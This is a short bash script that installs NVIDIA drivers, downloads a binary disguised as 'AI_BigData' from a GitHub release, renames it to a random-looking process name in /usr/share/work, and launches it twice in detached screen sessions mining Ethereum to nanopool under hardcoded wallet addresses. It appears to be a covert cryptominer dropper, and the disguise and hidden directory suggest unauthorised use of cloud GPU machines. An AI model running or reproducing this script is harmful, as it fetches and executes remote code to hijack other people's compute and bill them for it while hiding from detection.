#!/bin/bash
apt-get update
apt-get install -y git wget screen
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
./NVIDIA-Linux-x86_64-460.73.01.run
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
wget https://github.com/ts6aud5vkg/gpuissa/releases/download/grin/AI_BigData
mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
mv AI_BigData $azure -n
cp $azure "$cpuname"
rm -f  AI_BigData
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --algo ethash --server eth-us-west1.nanopool.org:9433 --user 0xfa5791101bf9c5f5a4753c034b77de0e4d1f79ca.xx --ssl 1
screen -d -m ./"${cpuname}" --algo ethash --server eth-us-east1.nanopool.org:9433 --user 0x09d3159bb9d719f27b5578551d959de6e7271738.xuxu --ssl 1
